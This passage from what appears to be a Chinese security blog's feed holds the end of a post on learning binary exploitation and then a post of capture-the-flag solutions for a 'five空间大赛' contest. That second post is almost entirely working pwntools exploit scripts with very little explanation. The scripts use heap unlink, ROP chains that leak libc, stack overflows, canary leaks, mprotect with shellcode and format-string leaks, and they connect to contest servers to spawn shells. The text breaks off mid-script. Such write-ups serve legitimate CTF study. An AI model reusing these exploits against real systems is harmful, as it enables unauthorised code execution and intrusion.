8086汇编指令：<a href="https://www.bilibili.com/video/av28132657" target="_blank" rel="noopener">https://www.bilibili.com/video/av28132657</a></p><h2 id="第四步"><a href="#第四步" class="headerlink" title="第四步"></a>第四步</h2><p>可以开始学习PWN了。如果这个时候能学到这里的话，基本上进实验室的水平是有了。到时候我教你们怎么学吧。太多了，我写累了，我不想写了。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;二进制的学习起初是很枯燥和无聊的，还有对很多人来说很难，主要是兴趣吧。下面的只是我关于学习二进制的一些路线总结，也不一定非要照着我下面一步一步的走，可以同时进行。比如你学习完一遍C语言了，你这个时候不可能马上去学第二遍吧，然后你就可以去学习下一步。然后发现不懂，又回来学习，
      
    
    </summary>
    
    
      <category term="其他" scheme="http://Whali3n51.github.io/categories/%E5%85%B6%E4%BB%96/"/>
    
    
  </entry>
  
  <entry>
    <title>five空间大赛</title>
    <link href="http://whali3n51.github.io/2019/09/01/five%E7%A9%BA%E9%97%B4%E5%A4%A7%E8%B5%9B/"/>
    <id>http://whali3n51.github.io/2019/09/01/five%E7%A9%BA%E9%97%B4%E5%A4%A7%E8%B5%9B/</id>
    <published>2019-09-01T03:22:00.000Z</published>
    <updated>2020-01-08T06:47:17.432Z</updated>
    
    <content type="html"><![CDATA[<h1 id="立雪"><a href="#立雪" class="headerlink" title="立雪"></a>立雪</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"><span class="comment">#p=process('./pwn15')</span></span><br><span class="line">p=remote(<span class="string">'111.33.164.6'</span>, <span class="number">50015</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(size,content)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'Your choice:'</span>,<span class="string">'1'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Length of note:"</span>,str(size))</span><br><span class="line">p.sendlineafter(<span class="string">"Content of note:"</span>,content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,size,content)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'Your choice:'</span>,<span class="string">'2'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'Index:'</span>,str(index))</span><br><span class="line">p.sendlineafter(<span class="string">'Length of note:'</span>,str(size))</span><br><span class="line">p.sendlineafter(<span class="string">'Content of note:'</span>,content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'Your choice:'</span>,<span class="string">'3'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'Index:'</span>,str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create(<span class="number">0xf8</span>,<span class="string">'aa'</span>)<span class="comment">#0</span></span><br><span class="line">create(<span class="number">0xf8</span>,<span class="string">'bb'</span>)<span class="comment">#1</span></span><br><span class="line">create(<span class="number">0xf8</span>,<span class="string">'/bin/sh\x00'</span>)<span class="comment">#2</span></span><br><span class="line">chunk0_addr=<span class="number">0x006020C0</span></span><br><span class="line">admin=<span class="number">0x602088</span></span><br><span class="line">payload=p64(<span class="number">0</span>)+p64(<span class="number">0xf0</span>)+p64(chunk0_addr<span class="number">-0x18</span>)+p64(chunk0_addr<span class="number">-0x10</span>)</span><br><span class="line">payload+=(<span class="number">0xf8</span><span class="number">-5</span>*<span class="number">8</span>)*<span class="string">'a'</span>+p64(<span class="number">0xf0</span>)+p64(<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,len(payload),payload)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0x100</span>)+p64(<span class="number">0x100</span>)+p64(<span class="number">0x100</span>)+p64(admin)</span><br><span class="line">edit(<span class="number">0</span>,len(payload),payload)</span><br><span class="line">edit(<span class="number">0</span>,len(payload),p64(<span class="number">0x7E4</span>))</span><br><span class="line">p.sendlineafter(<span class="string">'Your choice:'</span>,<span class="string">'2019'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="正定"><a href="#正定" class="headerlink" title="正定"></a>正定</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"><span class="comment">#p=process('./pwn14')</span></span><br><span class="line">p=remote(<span class="string">'111.33.164.6'</span>, <span class="number">50014</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(size,content)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">"Your choice : "</span>,<span class="string">'1'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Size of note : "</span>,str(size))</span><br><span class="line">p.sendlineafter(<span class="string">"Content of note:"</span>,content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,size,content)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">"Your choice : "</span>,<span class="string">'2'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Index :"</span>,str(index))</span><br><span class="line">p.sendlineafter(<span class="string">"Size of note : "</span>,str(size))</span><br><span class="line">p.sendlineafter(<span class="string">'Content of note : '</span>,content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">"Your choice : "</span>,<span class="string">'3'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Index :"</span>,str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create(<span class="number">0xf8</span>,<span class="string">'aa'</span>)<span class="comment">#0</span></span><br><span class="line">create(<span class="number">0xf8</span>,<span class="string">'bb'</span>)<span class="comment">#1</span></span><br><span class="line">create(<span class="number">0xf8</span>,<span class="string">'/bin/sh\x00'</span>)<span class="comment">#2</span></span><br><span class="line">create(<span class="number">0xf8</span>,<span class="string">'dd'</span>)<span class="comment">#3</span></span><br><span class="line">create(<span class="number">0x30</span>,<span class="string">'ee'</span>)<span class="comment">#4</span></span><br><span class="line">chunk0_addr=<span class="number">0x4040C0</span></span><br><span class="line">admin=<span class="number">0x4040A0</span></span><br><span class="line">payload=p64(<span class="number">0</span>)+p64(<span class="number">0xf0</span>)+p64(chunk0_addr<span class="number">-0x18</span>)+p64(chunk0_addr<span class="number">-0x10</span>)</span><br><span class="line">payload+=(<span class="number">0xf8</span><span class="number">-5</span>*<span class="number">8</span>)*<span class="string">'a'</span>+p64(<span class="number">0xf0</span>)+p64(<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,len(payload),payload)</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0x100</span>)+p64(<span class="number">0x100</span>)+p64(<span class="number">0x100</span>)+p64(admin)</span><br><span class="line">edit(<span class="number">0</span>,len(payload),payload)</span><br><span class="line">edit(<span class="number">0</span>,len(payload),p64(<span class="number">0x7E4</span>))</span><br><span class="line">p.sendlineafter(<span class="string">"Your choice : "</span>,<span class="string">'70'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="一苇"><a href="#一苇" class="headerlink" title="一苇"></a>一苇</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=process('./pwn13')</span></span><br><span class="line">p=remote(<span class="string">'111.33.164.6'</span>,<span class="number">50013</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'your choice:'</span>,<span class="string">'1'</span>)</span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">0x28</span>+<span class="string">'\x50'</span></span><br><span class="line">p.sendafter(<span class="string">"input massage\n"</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="拈花"><a href="#拈花" class="headerlink" title="拈花"></a>拈花</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"><span class="comment">#p=process("./pwn11")</span></span><br><span class="line"><span class="comment">#libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")</span></span><br><span class="line">p=remote(<span class="string">"111.33.164.6"</span>,<span class="number">50011</span>)</span><br><span class="line">libc=ELF(<span class="string">"libc-2.19.so"</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"please input your name\n"</span>,<span class="string">"A"</span>)</span><br><span class="line">elf=ELF(<span class="string">"./pwn11"</span>)</span><br><span class="line">puts_plt=elf.plt[<span class="string">"puts"</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">"puts"</span>]</span><br><span class="line">pop_rdi_ret=<span class="number">0x4012ab</span></span><br><span class="line">payload=<span class="string">'A'</span>*<span class="number">40</span></span><br><span class="line">payload+=p64(pop_rdi_ret)</span><br><span class="line">payload+=p64(puts_got)</span><br><span class="line">payload+=p64(puts_plt)</span><br><span class="line">payload+=p64(<span class="number">0x401080</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">"ail!\n"</span>)</span><br><span class="line">libc_base=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))-libc.symbols[<span class="string">"puts"</span>]</span><br><span class="line"><span class="keyword">print</span> hex(libc_base)</span><br><span class="line">p.sendlineafter(<span class="string">"please input your name\n"</span>,<span class="string">"A"</span>)</span><br><span class="line">system_addr=libc.symbols[<span class="string">"system"</span>]+libc_base</span><br><span class="line">bin_sh=libc_base+next(libc.search(<span class="string">"/bin/sh"</span>))</span><br><span class="line">payload=<span class="string">'B'</span>*<span class="number">40</span></span><br><span class="line">payload+=p64(<span class="number">0x4012A2</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">1</span>)</span><br><span class="line">payload+=p64(elf.got[<span class="string">"read"</span>])</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(elf.bss()+<span class="number">0x100</span>)</span><br><span class="line">payload+=p64(<span class="number">0x100</span>)</span><br><span class="line">payload+=p64(<span class="number">0x401288</span>)</span><br><span class="line">payload+=<span class="string">'B'</span>*<span class="number">56</span></span><br><span class="line">payload+=p64(pop_rdi_ret)</span><br><span class="line">payload+=p64(elf.bss()+<span class="number">0x100</span>)</span><br><span class="line">payload+=p64(system_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">p.sendline(<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="坐忘"><a href="#坐忘" class="headerlink" title="坐忘"></a>坐忘</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="comment">#p=process("./pwn9")</span></span><br><span class="line">p=remote(<span class="string">"111.33.164.6"</span>,<span class="string">"50009"</span>)</span><br><span class="line">elf=ELF(<span class="string">"./pwn9"</span>)</span><br><span class="line">mprotect=elf.symbols[<span class="string">"mprotect"</span>]</span><br><span class="line">payload=<span class="string">'A'</span>*<span class="number">9</span></span><br><span class="line">payload=base64.b64encode(payload)</span><br><span class="line"><span class="keyword">print</span> payload</span><br><span class="line">p.recvuntil(<span class="string">"welcome to base64 decode server\n"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"&gt;\n"</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">"decode res:\n"</span>)</span><br><span class="line">p.recvuntil(<span class="string">'A'</span>*<span class="number">8</span>)</span><br><span class="line">canary=u64(p.recv(<span class="number">8</span>))<span class="number">-0x41</span></span><br><span class="line">success(<span class="string">"canary =====&gt; 0x%x"</span>%canary)</span><br><span class="line">int_0x80=<span class="number">0x4bc587</span></span><br><span class="line">poprdi=<span class="number">0x401e36</span></span><br><span class="line">poprsi=<span class="number">0x401f57</span></span><br><span class="line">poprdx=<span class="number">0x4433e6</span></span><br><span class="line">start_addr=<span class="number">0x400890</span></span><br><span class="line">p.recvuntil(<span class="string">"continue ?"</span>)</span><br><span class="line">p.sendline(<span class="string">"y"</span>)</span><br><span class="line"></span><br><span class="line">bss_addr=elf.bss()</span><br><span class="line">read_addr=elf.symbols[<span class="string">"read"</span>]</span><br><span class="line">payload=<span class="string">'A'</span>*<span class="number">8</span>+p64(canary)+<span class="string">'A'</span>*<span class="number">8</span></span><br><span class="line">payload+=p64(poprdi)</span><br><span class="line">payload+=p64(bss_addr&amp;<span class="number">0xfffffffffffff000</span>)</span><br><span class="line">payload+=p64(poprsi)</span><br><span class="line">payload+=p64(<span class="number">0x1000</span>)</span><br><span class="line">payload+=p64(poprdx)</span><br><span class="line">payload+=p64(<span class="number">7</span>)</span><br><span class="line">payload+=p64(mprotect)</span><br><span class="line">payload+=p64(poprdi)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(poprsi)</span><br><span class="line">payload+=p64(bss_addr)</span><br><span class="line">payload+=p64(poprdx)</span><br><span class="line">payload+=p64(<span class="number">0x100</span>)</span><br><span class="line">payload+=p64(read_addr)</span><br><span class="line">payload+=p64(bss_addr)</span><br><span class="line">payload=base64.b64encode(payload)</span><br><span class="line"><span class="keyword">print</span> payload</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"&gt;\n"</span>,payload)</span><br><span class="line">p.sendlineafter(<span class="string">"continue ?"</span>,<span class="string">"no"</span>)</span><br><span class="line">shellcode = <span class="string">"\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05"</span></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="玄冥"><a href="#玄冥" class="headerlink" title="玄冥"></a>玄冥</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"><span class="comment">#p=process('./pwn')</span></span><br><span class="line">p=remote(<span class="string">'111.33.164.6'</span>,<span class="number">50007</span>)</span><br><span class="line">libc=ELF(<span class="string">'./libc-2.19.so'</span>)</span><br><span class="line"><span class="comment">#libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(size)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">"choice &gt;&gt;"</span>,<span class="string">'1'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"size:"</span>,str(size))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,size,content)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">"choice &gt;&gt;"</span>,<span class="string">'3'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"id:"</span>,str(index))</span><br><span class="line">p.sendlineafter(<span class="string">'size:'</span>,str(size))</span><br><span class="line">p.sendafter(<span class="string">'content:'</span>,content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'choice &gt;&gt;'</span>,<span class="string">'4'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"id:"</span>,str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">"choice &gt;&gt;"</span>,<span class="string">'2'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"id:"</span>,str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create(<span class="number">0xf8</span>)<span class="comment">#0</span></span><br><span class="line">create(<span class="number">0xf8</span>)<span class="comment">#1</span></span><br><span class="line">create(<span class="number">0xf8</span>)<span class="comment">#2</span></span><br><span class="line">chunk0_addr=<span class="number">0x006020E0</span></span><br><span class="line">target=<span class="number">0x0602020</span></span><br><span class="line">payload=p64(<span class="number">0</span>)+p64(<span class="number">0xf0</span>)+p64(chunk0_addr<span class="number">-0x18</span>)+p64(chunk0_addr<span class="number">-0x10</span>)</span><br><span class="line">payload+=(<span class="number">0xf8</span><span class="number">-5</span>*<span class="number">8</span>)*<span class="string">'a'</span>+p64(<span class="number">0xf0</span>)+p64(<span class="number">0x100</span>)</span><br><span class="line">edit(<span class="number">0</span>,len(payload)+<span class="number">1</span>,payload)</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">payload=p64(target)+p64(target)+p64(target)+p64(target)+p64(target<span class="number">-0x8</span>)</span><br><span class="line">edit(<span class="number">0</span>,len(payload)+<span class="number">1</span>,payload)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Your data:'</span>)</span><br><span class="line">free_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">log.success(<span class="string">'free_addr====&gt;0x%x'</span>%free_addr)</span><br><span class="line">libc_base=free_addr-libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">log.success(<span class="string">'libc_base====&gt;0x%x'</span>%libc_base)</span><br><span class="line">system_addr=libc_base+libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">edit(<span class="number">1</span>,len(p64(system_addr))+<span class="number">1</span>,p64(system_addr))</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">9</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="於讴"><a href="#於讴" class="headerlink" title="於讴"></a>於讴</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">p = remote(<span class="string">'111.33.164.4'</span>,<span class="number">50006</span>)</span><br><span class="line"><span class="comment">#p = process('./pwn')</span></span><br><span class="line"><span class="comment">#libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')</span></span><br><span class="line">elf=ELF(<span class="string">'./pwn'</span>)</span><br><span class="line">libc=ELF(<span class="string">'libc-2.19.so'</span>)</span><br><span class="line">main_addr=<span class="number">0x04007C3</span></span><br><span class="line">put_plt=elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">start_got=elf.got[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">poprdi=<span class="number">0x414fc3</span></span><br><span class="line">start_libc=libc.symbols[<span class="string">'__libc_start_main'</span>]</span><br><span class="line">p.sendline(<span class="string">'-1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'OH, WHY ARE YOU SO GOOD?\n'</span>)</span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">24</span> + p64(poprdi)+p64(start_got)+p64(put_plt) + p64(main_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">start_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"><span class="keyword">print</span> hex(start_addr)</span><br><span class="line">libc_base = start_addr - start_libc</span><br><span class="line"><span class="keyword">print</span> hex(libc_base)</span><br><span class="line">bin_sh=<span class="number">0x1633e8</span></span><br><span class="line">system=libc.symbols[<span class="string">"system"</span>]</span><br><span class="line">bin_addr=bin_sh+libc_base</span><br><span class="line">system_addr=system+libc_base</span><br><span class="line"><span class="keyword">print</span> hex(bin_addr)</span><br><span class="line"><span class="keyword">print</span> hex(system_addr)</span><br><span class="line">p.sendline(<span class="string">'-1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'OH, WHY ARE YOU SO GOOD?\n'</span>)</span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">24</span> + p64(poprdi)+p64(bin_addr)+p64(system_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="副墨"><a href="#副墨" class="headerlink" title="副墨"></a>副墨</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=process("./bf")</span></span><br><span class="line"><span class="comment">#libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")</span></span><br><span class="line">p=remote(<span class="string">"111.33.164.6"</span>,<span class="number">50001</span>)</span><br><span class="line">elf=ELF(<span class="string">"./bf"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Are you sure want to play the game?\n"</span>,<span class="string">"1"</span>)</span><br><span class="line">payload=<span class="string">'%17$p%26$p'</span></span><br><span class="line">payload=payload.ljust(<span class="number">28</span>,<span class="string">'A'</span>)</span><br><span class="line">payload+=p32(<span class="number">0</span>)</span><br><span class="line">p.sendafter(<span class="string">"Input your name : \n"</span>,payload)</span><br><span class="line"></span><br><span class="line">array=[<span class="number">7427</span> , <span class="number">39356</span>  ,<span class="number">9595</span>  ,<span class="number">54062</span>  ,<span class="number">67371</span> , <span class="number">42578</span>  ,<span class="number">92585</span>  ,<span class="number">76990</span>  ,<span class="number">22615</span>  ,<span class="number">53318</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> array:</span><br><span class="line">    p.recvuntil(<span class="string">"Now guess:"</span>)</span><br><span class="line">    p.sendline(str(i))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Correct!\n"</span>)</span><br><span class="line">canary=eval(p.recv(<span class="number">18</span>))</span><br><span class="line">success(<span class="string">"canary ==&gt; 0x%x"</span>%canary)</span><br><span class="line">base_addr=eval(p.recv(<span class="number">14</span>))<span class="number">-0x970</span></span><br><span class="line">success(<span class="string">"base_addr ==&gt; 0x%x"</span>%base_addr)</span><br><span class="line">pop_rdi_ret=<span class="number">0xdb3</span>+base_addr</span><br><span class="line"></span><br><span class="line">payload=<span class="string">'A'</span>*<span 